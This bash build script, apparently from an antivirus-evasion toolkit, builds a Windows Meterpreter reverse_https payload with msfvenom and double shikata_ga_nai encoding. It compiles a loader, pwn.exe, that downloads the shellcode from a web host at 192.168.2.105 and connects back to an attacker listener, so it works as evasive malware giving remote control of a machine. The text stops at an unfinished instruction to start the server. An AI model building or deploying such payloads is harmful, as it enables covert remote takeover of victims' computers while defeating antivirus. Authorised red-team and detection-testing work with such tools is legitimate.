#!/bin/bash        
# example build script

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter reverse payload, encoded with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 2 -f c -a x86 --platform Windows > sc.txt

# format the shellcode for make_avet
./format.sh sc.txt > scclean.txt && rm sc.txt

# call make_avet, compile 
./make_avet -E -u 192.168.2.105/scclean.txt
$win32_compiler -o pwn.exe avet.c

# cleanup
echo " " > defs.h

# now copy scclean.txt to your web root and start 
